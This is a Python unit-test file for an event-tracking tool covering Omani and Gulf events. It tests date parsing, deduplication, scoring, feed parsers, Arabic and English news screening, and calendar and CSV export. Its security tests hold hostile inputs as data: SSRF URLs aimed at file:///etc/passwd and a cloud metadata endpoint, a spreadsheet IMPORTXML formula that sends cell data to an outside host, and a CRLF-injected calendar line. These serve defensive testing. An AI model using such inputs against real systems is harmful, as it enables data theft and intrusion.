import datetime as dt
import json
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from radar import adapters, export, fetch, model  # noqa: E402

D = dt.date
CFG = json.load(open(os.path.join(os.path.dirname(__file__), "..", "sources.json"), encoding="utf-8"))
RULES = CFG["rules"]


def ev(title, start, **kw):
    return model.Event(title, start, **kw)


class Dates(unittest.TestCase):
    def test_formats(self):
        self.assertEqual(model.parse_date("2026-11-02 11:00:00"), D(2026, 11, 2))
        self.assertEqual(model.parse_date("20261028T140000"), D(2026, 10, 28))
        self.assertEqual(model.parse_date("1 Dec", 2026), D(2026, 12, 1))
        self.assertEqual(model.parse_date("February 18-19, 2025"), D(2025, 2, 18))
        self.assertIsNone(model.parse_date("To Be Announced"))
        self.assertIsNone(model.parse_date("31 Feb", 2026))

    def test_dates_in_text(self):
        self.assertEqual(model.find_date_range("Expo on 6-9 Sep 2026"), (D(2026, 9, 6), D(2026, 9, 9)))
        self.assertEqual(model.find_date_range("on November 3, 2026"), (D(2026, 11, 3), None))
        self.assertEqual(model.find_date_range("معرض ١٢ - ١٥ مارس 2026"), (D(2026, 3, 12), D(2026, 3, 15)))
        self.assertEqual(model.find_date_range("no date here"), (None, None))


class Dedupe(unittest.TestCase):
    def test_same_event_different_spelling(self):
        a = ev("COMEX 2026", D(2026, 9, 6), source="ocec", tier="A")
        b = ev("COMEX", D(2026, 9, 6), source="seed", tier="B", url="https://comex")
        [out] = model.dedupe([b, a])
        self.assertEqual(out.url, "https://comex")         # filled from the lower-trust copy
        self.assertEqual(out.sources, ["ocec", "seed"])

    def test_editions_stay_separate(self):
        a = ev("COMEX 2026", D(2026, 9, 6))
        b = ev("COMEX 2027", D(2026, 9, 10))
        self.assertEqual(len(model.dedupe([a, b])), 2)

    def test_rounds_on_different_dates_stay_separate(self):
        a = ev("Oman International Drift Championship (Rounds)", D(2026, 1, 22))
        b = ev("Oman International Drift Championship (Rounds)", D(2026, 2, 5))
        self.assertEqual(len(model.dedupe([a, b])), 2)

    def test_wider_window_needs_same_venue(self):
        a = ev("Project Oman", D(2026, 11, 2), venue="OCEC")
        b = ev("Project Oman", D(2026, 11, 12), venue="OCEC")
        c = ev("Project Oman", D(2026, 11, 12), venue="Sheraton")
        self.assertEqual(len(model.dedupe([a, b])), 1)
        self.assertEqual(len(model.dedupe([a, c])), 2)


class Scoring(unittest.TestCase):
    def test_tech_event_is_high_without_geography_bonus(self):
        e = ev("Enterprise AI Expo", D(2026, 5, 13), venue="Riyadh")
        self.assertEqual(model.score(e, RULES)[1:], ("High", "Tech & AI"))

    def test_marketing_copy_does_not_make_fisheries_tech(self):
        e = ev("IORA Aquaculture & Fisheries Business Forum", D(2026, 12, 1),
               description="innovation, technology and digital solutions for the blue economy")
        self.assertEqual(model.score(e, RULES)[2], "Industry & Energy")

    def test_concert_is_low(self):
        e = ev("Elissa Live in Muscat concert", D(2026, 11, 13), description="innovation and digital stage")
        self.assertEqual(model.score(e, RULES)[1], "Low")

    def test_word_it_does_not_count_as_tech(self):
        e = ev("Comedy night", D(2026, 5, 13), description="Join it for fun")
        self.assertNotEqual(model.score(e, RULES)[2], "Tech & AI")

    def test_region(self):
        self.assertEqual(model.region(ev("X", D(2026, 1, 1), venue="OCEC, Muscat"), CFG["regions"]), "Oman")
        self.assertEqual(model.region(ev("X", D(2026, 1, 1), city="Riyadh"), CFG["regions"]), "GCC")
        self.assertEqual(model.region(ev("X", D(2026, 1, 1), venue="ITC Maratha, Mumbai"), CFG["regions"]), "Other")
        self.assertEqual(model.region(ev("Surgery day", D(2026, 1, 1), venue="Hall 1"), CFG["regions"]), "Other")

    def test_spam_and_always_on_aggregator_listing_excluded(self):
        self.assertTrue(model.excluded(ev("House Shifting loading unloading", D(2027, 4, 1)), RULES))
        self.assertTrue(model.excluded(ev("Webinar", D(2024, 6, 2), end=D(2026, 11, 1), tier="C"), RULES))
        # a long official programme is kept
        self.assertFalse(model.excluded(ev("Muscat Nights", D(2026, 1, 1), end=D(2026, 3, 31), tier="A"), RULES))


class Verification(unittest.TestCase):
    def test_confidence_and_status(self):
        agg = ev("Pitch Night", D(2026, 12, 1), tier="C", sources=["allevents"], tiers=["C"])
        agg.confidence = model.confidence(agg)
        self.assertEqual(model.status(agg, D(2026, 10, 25), 60, 40), "Needs review")
        both = ev("Pitch Night", D(2026, 12, 1), tiers=["B", "C"], sources=["seed", "allevents"])
        both.confidence = model.confidence(both)
        self.assertEqual(model.status(both, D(2026, 10, 25), 60, 40), "Upcoming")

    def test_cancelled(self):
        e = ev("X", D(2026, 12, 1), status_hint="EventCancelled")
        self.assertEqual(model.status(e, D(2026, 10, 25), 60, 40), "Cancelled")
        self.assertEqual(model.post_plan(e, CFG["post_plans"]), {})

    def test_stable_id_survives_reschedule_but_not_new_edition(self):
        first = ev("COMEX", D(2026, 9, 6))
        rid = model.assign_id(first, {})
        known = {rid: {"series": model.series_key("COMEX"), "start": "2026-09-06", "kind": "event"}}
        moved = ev("COMEX", D(2026, 10, 1))
        self.assertEqual(model.assign_id(moved, known), rid)
        self.assertEqual(moved.previous_start, "2026-09-06")
        self.assertNotEqual(model.assign_id(ev("COMEX", D(2027, 9, 5)), known), rid)

    def test_monthly_series_keeps_each_editions_id(self):
        # Sep dropped out of the source (past); Oct and Nov must keep their own ids, not shift onto Sep's / Oct's
        key = model.series_key("Startup Majlis")
        known = {"S": {"series": key, "start": "2026-09-10", "kind": "event"},
                 "O": {"series": key, "start": "2026-10-10", "kind": "event"},
                 "N": {"series": key, "start": "2026-11-10", "kind": "event"}}
        october, november = ev("Startup Majlis", D(2026, 10, 10)), ev("Startup Majlis", D(2026, 11, 10))
        self.assertEqual(model.assign_id(october, known), "O")
        self.assertEqual(model.assign_id(november, known), "N")
        self.assertEqual((october.previous_start, november.previous_start), ("", ""))

    def test_expected_next_edition(self):
        hist = [{"series": "comex", "title": "COMEX 2026", "start": "2026-09-06", "end": "2026-09-09",
                 "relevance": "High"}]
        [nxt] = model.expected_editions(hist, [], D(2026, 10, 25))
        self.assertEqual((nxt.title, nxt.start, nxt.end, nxt.kind), ("COMEX 2027", D(2027, 9, 5), D(2027, 9, 8), "expected"))
        self.assertEqual(model.expected_editions(hist, [ev("COMEX 2027", D(2027, 2, 1))], D(2026, 10, 25)), [])

    def test_workflow_depends_on_relevance(self):
        e = ev("X", D(2026, 11, 30), end=D(2026, 12, 2), relevance="High")
        plan = model.post_plan(e, CFG["post_plans"])
        self.assertEqual((plan["brief"], plan["recap"]), (D(2026, 11, 9), D(2026, 12, 3)))
        e.relevance = "Low"
        self.assertEqual(model.post_plan(e, CFG["post_plans"]), {})


class Parsers(unittest.TestCase):
    def test_ical(self):
        text = ("BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\nDTSTART;VALUE=DATE:20261201\r\nDTEND;VALUE=DATE:20261204\r\n"
                "SUMMARY:Oman AgroFood\\, 2026\r\nURL:https://x\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n")
        [e] = adapters.parse_ical(text, "t")
        self.assertEqual((e.title, e.start, e.end), ("Oman AgroFood, 2026", D(2026, 12, 1), D(2026, 12, 3)))

    def test_jsonld_nested_status_and_organizer(self):
        page = ('<script type="application/ld+json">{"@type":"ItemList","itemListElement":[{"item":'
                '{"@type":"BusinessEvent","name":"Pitch Night","startDate":"2026-11-10T18:00",'
                '"eventStatus":"https://schema.org/EventPostponed",'
                '"organizer":{"name":"Org","url":"https://org.example"},'
                '"location":{"name":"KOM","address":{"addressLocality":"Muscat"}},'
                '"offers":{"price":"5","priceCurrency":"OMR"}}}]}</script>')
        [e] = adapters.parse_jsonld(page, "t")
        self.assertEqual((e.title, e.venue, e.city, e.ticket_price, e.status_hint, e.organizer_url),
                         ("Pitch Night", "KOM", "Muscat", "5 OMR", "EventPostponed", "https://org.example"))

    def test_broken_rss_falls_back_and_keeps_undated(self):
        feed = ('<rss><channel><item><title>Oman Expo 2-4 Dec 2026</title><x:y>bad</x:y><link>https://n</link></item>'
                '<item><title>Registration opens for Oman AI Summit</title><link>https://m</link></item></channel></rss>')
        out = adapters._rss_items(feed, {"name": "n"}, ["expo", "summit"])
        self.assertEqual([(e.title, e.start) for e in out],
                         [("Oman Expo 2-4 Dec 2026", D(2026, 12, 2)), ("Registration opens for Oman AI Summit", None)])

    def test_page_watch_lines(self):
        class F:
            def get(self, url):
                return ("<html><body><h3>Oman Design &amp; Build Week</h3><p>19 - 21 April 2027</p>"
                        "<li>Oman Petroleum &amp; Energy Show 26-28 April 2027</li><script>var x='1 Jan 2030'</script></body></html>")
        src = {"name": "connect", "url": "https://connect.example/"}
        out = adapters.page_watch(F(), src)
        self.assertEqual([(e.title, e.start, e.end) for e in out],
                         [("Oman Design & Build Week", D(2027, 4, 19), D(2027, 4, 21)),
                          ("Oman Petroleum & Energy Show", D(2027, 4, 26), D(2027, 4, 28))])
        self.assertTrue(src["_hash"])

    def test_page_watch_skips_place_and_button_titles(self):
        class F:
            def get(self, url):
                return ("<p>Muscat, Oman</p><p>Muscat, Oman 18 April 2027</p><p>VISIT WEBSITE 18 April 2027</p>"
                        "<p>08:00 AM 5 Oct 2027</p><p>INDUSTRY NEWS</p><p>5 Oct 2027</p>")
        self.assertEqual(adapters.page_watch(F(), {"name": "x", "url": "https://x.example/"}), [])


class Security(unittest.TestCase):
    def test_ssrf_guard(self):
        for bad in ("http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/latest/meta-data",
                    "http://10.0.0.5/", "file:///etc/passwd", "ftp://example.com/", "http://user:pw@example.com/",
                    "http://[::1]/"):
            with self.assertRaises(fetch.UnsafeURL, msg=bad):
                fetch.check_public(bad)


class Export(unittest.TestCase):
    def test_ics_folds_utf8_safely(self):
        out = export._ics("t", [("1", D(2026, 1, 1), D(2026, 1, 1), "معرض " * 40, "", "", "", False)],
                          "20260101T000000Z")
        for line in out.split("\r\n"):
            self.assertLessEqual(len(line.encode()), 75)

    def test_change_entry_contract(self):
        rec = {"id": "abc", "version": 3}
        c = export.change(7, "event.updated", rec, "2026-10-25T03:00:00+00:00")
        self.assertEqual((c["sequence"], c["idempotency_key"], c["schema_version"]),
                         (7, "abc:3:event.updated", export.SCHEMA_VERSION))


if __name__ == "__main__":
    unittest.main()


class News(unittest.TestCase):
    from radar import news  # noqa: E402

    EN_PAGE = """<html><head><meta property="og:description" content="Muscat set to host regional tech leaders">
    <meta property="article:published_time" content="2026-10-20T08:00:00+04:00"></head><body><nav><p>Menu item that should be ignored by the reader</p></nav>
    <article><p>The 3rd Oman Fintech Summit 2026 will be held at the Oman Convention and Exhibition Centre on 18-19 November 2026, bringing together banks and startups.</p>
    <p>The summit is organised by the Central Bank of Oman in partnership with industry players from the region.</p></article></body></html>"""

    AR_PAGE = """<html><head><meta property="og:description" content="تنطلق فعاليات الملتقى الشهر المقبل"></head><body><article>
    <p>تنطلق أعمال «ملتقى عُمان للذكاء الاصطناعي» في واحة المعرفة مسقط يومي ١٢ - ١٣ ديسمبر 2026 بمشاركة واسعة من الشركات الناشئة والجهات الحكومية.</p>
    <p>ويأتي الملتقى بتنظيم من وزارة النقل والاتصالات وتقنية المعلومات ضمن جهود التحول الرقمي في السلطنة.</p></article></body></html>"""

    ALIASES = json.load(open(os.path.join(os.path.dirname(__file__), "..", "sources.json"), encoding="utf-8"))["news"]["venue_aliases"]

    def test_reads_english_article(self):
        news = self.news
        meta, body = news.read_article(self.EN_PAGE)
        self.assertNotIn("Menu item", body)
        self.assertEqual(meta["og:description"], "Muscat set to host regional tech leaders")
        self.assertEqual(news.pick_dates(body, D(2026, 10, 20), D(2026, 10, 25)), (D(2026, 11, 18), D(2026, 11, 19)))
        self.assertEqual(news.find_venue(body, self.ALIASES), "Oman Convention & Exhibition Centre")
        self.assertEqual(news.find_organizer(body, "en"), "Central Bank of Oman")
        self.assertEqual(news.event_name("Banks gather in Muscat", body, "en"), "3rd Oman Fintech Summit 2026")

    def test_reads_arabic_article(self):
        news = self.news
        _, body = news.read_article(self.AR_PAGE)
        self.assertEqual(news.pick_dates(body, D(2026, 10, 24), D(2026, 10, 25)), (D(2026, 12, 12), D(2026, 12, 13)))
        self.assertEqual(news.find_venue(body, self.ALIASES), "Knowledge Oasis Muscat")
        self.assertEqual(news.event_name("خبر", body, "ar"), "ملتقى عُمان للذكاء الاصطناعي")
        self.assertTrue(news.find_organizer(body, "ar").startswith("وزارة النقل"))

    def test_old_dates_are_not_events(self):
        self.assertEqual(self.news.pick_dates("held on 2 March 2025", D(2026, 10, 20), D(2026, 10, 25)), (None, None))

    def test_collect_reads_each_article_once(self):
        news = self.news
        feed = ('<rss><channel><item><title>Oman Fintech Summit to open in November</title><link>https://n.example/a</link>'
                '<pubDate>Tue, 20 Oct 2026 08:00:00 GMT</pubDate></item>'
                '<item><title>Weather update</title><link>https://n.example/b</link></item></channel></rss>')
        page = self.EN_PAGE

        class F:
            calls = []
            def get(self, url):
                self.calls.append(url)
                return feed if url.endswith("/rss") else page
        cfg = {"news": {"feeds": [{"name": "t", "label": "T", "lang": "en", "url": "https://n.example/rss"}],
                        "keywords_en": ["summit"], "keywords_ar": [], "venue_aliases": self.ALIASES}}
        state, f = {}, F()
        arts, evs, _ = news.collect(f, cfg, state, D(2026, 10, 25))
        self.assertEqual([a["title"] for a in arts], ["Oman Fintech Summit to open in November"])  # weather filtered out
        self.assertEqual((evs[0].title, evs[0].start, evs[0].tier), ("3rd Oman Fintech Summit 2026", D(2026, 11, 18), "D"))
        news.collect(f, cfg, state, D(2026, 10, 25))
        self.assertEqual(f.calls.count("https://n.example/a"), 1)  # second run used the cache


class NewsDates(unittest.TestCase):
    from radar import news  # noqa: E402

    def pick(self, text, pub, lang="en", title=""):
        return self.news.pick_dates(text, pub, D(2026, 10, 25), lang=lang, title=title)

    def test_cross_month_range_without_year(self):
        self.assertEqual(self.pick("30th Muscat International Book Fair set for March 24-April 3", D(2026, 10, 25)),
                         (D(2027, 3, 24), D(2027, 4, 3)))

    def test_range_without_year_this_year(self):
        self.assertEqual(self.pick("The forum runs on November 18-19 at OCEC", D(2026, 10, 25)), (D(2026, 11, 18), D(2026, 11, 19)))
        self.assertEqual(self.pick("يقام المعرض من 12 إلى 14 ديسمبر", D(2026, 10, 25), "ar"), (D(2026, 12, 12), D(2026, 12, 14)))

    def test_weekday_in_headline(self):
        # 24 Oct 2026 is a Saturday; "on Monday" → 26 Oct
        self.assertEqual(self.pick("", D(2026, 10, 24), title="Media Excellence Competition Awards 2026 on Monday"), (D(2026, 10, 26), None))
        self.assertEqual(self.pick("", D(2026, 10, 24), "ar", title='27 ورقة عمل في ندوة "جنوب الباطنة في ذاكرة التاريخ العُماني".. الاثنين'),
                         (D(2026, 10, 26), None))

    def test_no_date_stays_none(self):
        self.assertEqual(self.pick("SalamAir launches flights to Erbil", D(2026, 10, 25), title="SalamAir launches flights"), (None, None))

    def test_excluded_headlines(self):
        cfg = json.load(open(os.path.join(os.path.dirname(__file__), "..", "sources.json"), encoding="utf-8"))["news"]
        self.assertEqual(self.news.screen("SalamAir launches flights to Erbil", "a new air show route", "en", cfg), "off-topic")

    def test_tomorrow_headline_beats_a_loose_body_date(self):
        # "غدا.." (tomorrow) on 25 Oct → 26 Oct, even though the body mentions 28 October
        self.assertEqual(self.pick("وتختتم الندوة 28 أكتوبر", D(2026, 10, 25), "ar",
                                   title='غدا.. "الوثائق والمحفوظات الوطنية" تقيم ندوة جنوب الباطنة'), (D(2026, 10, 26), None))
        # a body range that starts on the headline's day keeps its end
        self.assertEqual(self.pick("The forum runs October 26-28", D(2026, 10, 25), title="Forum opens tomorrow"),
                         (D(2026, 10, 26), D(2026, 10, 28)))

    def test_undated_past_date_is_not_moved_a_year_ahead(self):
        # a late-October review of an exhibition that opened on 3 October is not a 2027 event
        self.assertEqual(self.pick("Flora & Fauna opened on October 3 at the gallery", D(2026, 10, 25)), (None, None))
        self.assertEqual(self.pick("Muscat Book Fair returns on 20 February", D(2026, 10, 25)), (D(2027, 2, 20), None))

    def test_quoted_arabic_event_name(self):
        self.assertEqual(self.news.event_name('27 ورقة عمل في ندوة "جنوب الباطنة في ذاكرة التاريخ العُماني".. الاثنين', "", "ar"),
                         "ندوة جنوب الباطنة في ذاكرة التاريخ العُماني")


class NewsScreening(unittest.TestCase):
    """Real headlines from the 25–26 Oct 2026 feeds: what is Omani event news and what is not."""
    from radar import news  # noqa: E402
    CFG = json.load(open(os.path.join(os.path.dirname(__file__), "..", "sources.json"), encoding="utf-8"))["news"]

    def why(self, title, summary, lang):
        return self.news.screen(title, summary, lang, self.CFG)

    def test_not_event_news(self):
        cases = [
            ("Dollar eases on lower oil prices", "Major currencies traded in tight ranges on Monday at the start of a busy week of central bank decisions", "en"),
            ("الذهب قرب أدنى مستوى في 3 أشهر ترقبًا لقرار الفيدرالي", "واشنطن- رويترز حومت أسعار الذهب قرب أدنى مستوى لها هذا الأسبوع", "ar"),
            ("PDO awards SLB five-year well stimulation contract", "MUSCAT, OCT 25 Petroleum Development Oman (PDO) has awarded SLB a five-year contract", "en"),
            ("ريال مدريد يعلن غياب كورتوا عن الكلاسيكو", "مدريد - رويترز أعلن ريال مدريد أن حارس مرماه سيغيب عن مباراة القمة", "ar"),
            ("منافسة محتدمة على جائزة الكرة الذهبية", "لندن «أ.ف.ب»: يُقام حفل توزيع جائزة الكرة الذهبية", "ar"),
            ("Art", "Salvadoran artist Luis Serrano paints a mural during a street art festival in San Marcos, El Salvador. — AFP", "en"),
            ("\"لولو\" تُطلق الموسم الثاني من \"عالم المأكولات\"", "مسقط- الرؤية أطلقت سلسلة متاجر لولو هايبر ماركت الموسم الثاني في معرض", "ar"),
            ("منح وزارة الصحة شهادة إشادة شرفية ضمن جوائز الاتحاد الدولي للمستشفيات", "مسقط- الرؤية نالت سلطنة عُمان جائزة التميز خلال الكونغرس العالمي", "ar"),
            ("بريطانيا تواجه عاصفة قوية وتحذيرات من اضطراب النقل", "لندن – الوكالات تستعد مناطق في المملكة المتحدة خلال عطلة نهاية الأسبوع", "ar"),
            ("فرنسا تستعد لموجة احتجاجات جديدة وتنشر 70 ألف شرطي", "باريس- الوكالات تترقب فرنسا موجة جديدة خلال عطلة نهاية الأسبوع", "ar"),
            ("Bayeux Tapestry will not be hung again", "The tapestry returns to France from an exhibition in Britain", "en"),
            ("Unseen Van Gogh painting exhibited in Hong Kong", "Hundreds queued outside a Hong Kong gallery to see the exhibition", "en"),
            ("Conference urges AI-backed preservation of Omani heritage", "KUALA LUMPUR: The 10th International Scientific Conference recommended", "en"),
            ("Oman wraps up child wellbeing summit in Uzbekistan", "SAMARKAND: The Sultanate of Oman concluded its participation in the Global Summit", "en"),
            ("شراكات تجارية تتوّج ختام مشاركة عُمان في معرض \"سيال\" باريس", "مسقط- الرؤية اختتمت سلطنة عُمان مشاركتها في معرض سيال", "ar"),
            ("مهرجان البحرين المسرحي الخامس يكشف عن برنامج فعالياته", "المنامة - أعلن المهرجان برنامجه", "ar"),
            ("مهرجان القاهرة السينمائي الدولي يفتح باب اعتماد الطلاب", "يفتح المهرجان باب الاعتماد", "ar"),
            ("4ر39 مليون ريال عُماني إجمالي قيمة أذون الخزانة الحكومية المخصصة لهذا الأسبوع", "مسقط- العُمانية", "ar"),
            ("سلمى الهاشمية تفوز بـ\"زمالة القيادة\" لأول مرة على مستوى الخليج", "مسقط- الرؤية فازت خلال المؤتمر", "ar"),
        ]
        for title, summary, lang in cases:
            with self.subTest(title=title):
                self.assertNotEqual(self.why(title, summary, lang), "")

    def test_event_news_kept(self):
        cases = [
            ("المؤتمر العلمي لكلية الحقوق يناقش التغيرات المناخية والتحول في الطاقة.. الأربعاء", "مسقط- الرؤية تنظم كلية الحقوق بجامعة السلطان قابوس المؤتمر العلمي العاشر", "ar"),
            ("Geriatrics conference calls for Alzheimer’s care", "MUSCAT: The fourth conference on Geriatrics and Gerontology has called for", "en"),
            ("Chinese Film Week kicks off in Oman", "The Chinese Film Week in Oman will be held from October 21 to 24 at VOX Cinemas", "en"),
            ("انطلاق أعمال \"الملتقى الأدبي والفني\" في صحار", "مسقط- الرؤية تنطلق فعاليات الملتقى الأدبي والفني في نسخته الثامنة والعشرين", "ar"),
            ("Media Excellence Competition Awards 2026 on Monday", "The Ministry of Information will organize the awards ceremony", "en"),
            ("ختام فعاليات المعرض الإبداعي النسائي أيقونة بهلا", "اختتمت بقاعة بوابة بهلا فعالية المعرض الإبداعي النسائي", "ar"),
        ]
        for title, summary, lang in cases:
            with self.subTest(title=title):
                self.assertEqual(self.why(title, summary, lang), "")

    def test_place_is_a_whole_word(self):
        self.assertFalse(self.news._place_hits("الملتقى الأدبي والفني", ["دبي"]))
        self.assertTrue(self.news._place_hits("يقام المعرض بدبي الأسبوع المقبل", ["دبي"]))

    def test_opinion_and_market_sections(self):
        page = '<nav class="breadcrumb"><a href="/">الرئيسية</a><a href="/c">المقالات</a><a href="/r">رؤى</a></nav>'
        self.assertIn("المقالات", self.news.sections(page))
        self.assertIn("business/markets", self.news.sections("", "https://www.omanobserver.om/article/1198576/business/markets/dollar-eases"))

    def test_same_event_folded_into_one(self):
        a = {"lang": "ar", "published": "2026-10-25", "source": "الرؤية", "url": "u1", "event": None,
             "title": "انطلاق المهرجان العلمي لتقييم الابتكارات الطلابية ومسابقات الذكاء الاصطناعي بالبريمي",
             "summary": "انطلقت اليوم بمركز البريمي للعلوم والابتكار فعاليات المهرجان العلمي لتقييم الابتكارات الطلابية"}
        b = dict(a, source="جريدة عُمان", url="u2", title='منافسات قوية بـ"المهرجان العلمي لتقييم الابتكارات الطلابية" في البريمي',
                 summary="البريمي- ناصر العبري انطلقت بمركز البريمي للعلوم والابتكار فعاليات المهرجان العلمي لتقييم الابتكارات الطلابية")
        c = dict(a, url="u3", title="Chinese Film Week kicks off in Oman", lang="en", summary="")
        kept = self.news.fold_duplicates([a, b, c])
        self.assertEqual([k["url"] for k in kept], ["u1", "u3"])
        self.assertEqual(kept[0]["also"], [{"source": "جريدة عُمان", "url": "u2", "title": b["title"]}])


class AuditFixes(unittest.TestCase):
    def test_csv_cells_cannot_become_formulas(self):
        self.assertEqual(export._cell('=IMPORTXML("https://x/?"&A1,"//a")'), '\'=IMPORTXML("https://x/?"&A1,"//a")')
        self.assertEqual(export._cell("@SUM(A1)"), "'@SUM(A1)")
        self.assertEqual(export._cell("Oman Fintech Summit"), "Oman Fintech Summit")

    def test_utc_times_become_muscat_times(self):
        self.assertEqual(model.parse_time("20261028T140000Z"), "18:00")
        self.assertEqual(model.parse_time("2026-10-28T06:30:00+00:00"), "10:30")
        self.assertEqual(model.parse_date("2026-10-28T22:00:00Z"), D(2026, 10, 29))   # already the 29th in Muscat
        self.assertEqual(model.parse_date("2026-10-28T22:00:00"), D(2026, 10, 28))    # no offset: as written

    def test_ics_timed_event_and_safe_url(self):
        out = export._ics("t", [("1", D(2026, 11, 2), D(2026, 11, 2), "Forum", "", "https://x.om/a\r\nBEGIN:VEVENT", "",
                                 False, "11:00", "13:30")], "20260101T000000Z")
        self.assertIn("DTSTART;TZID=Asia/Muscat:20261102T110000", out)
        self.assertIn("DTEND;TZID=Asia/Muscat:20261102T133000", out)
        self.assertIn("TZID:Asia/Muscat", out)
        self.assertEqual(out.count("\r\nBEGIN:VEVENT"), 1)                             # no injected event line
        self.assertIn("URL:https://x.om/aBEGIN:VEVENT", out)

    def test_news_range_into_next_year(self):
        from radar import news
        self.assertEqual(news.pick_dates("The festival runs 28 December - 3 January", D(2026, 12, 1), D(2026, 12, 1)),
                         (D(2026, 12, 28), D(2027, 1, 3)))


class Times(unittest.TestCase):
    def test_parse_time(self):
        self.assertEqual(model.parse_time("2026-11-02 11:00:00"), "11:00")
        self.assertEqual(model.parse_time("2026-10-28T18:30+04:00"), "18:30")
        self.assertEqual(model.parse_time("2026-10-28"), "")
        self.assertEqual(model.parse_time("2026-10-28T00:00:00"), "")
        self.assertEqual(model.parse_time("20261028T140000"), "14:00")
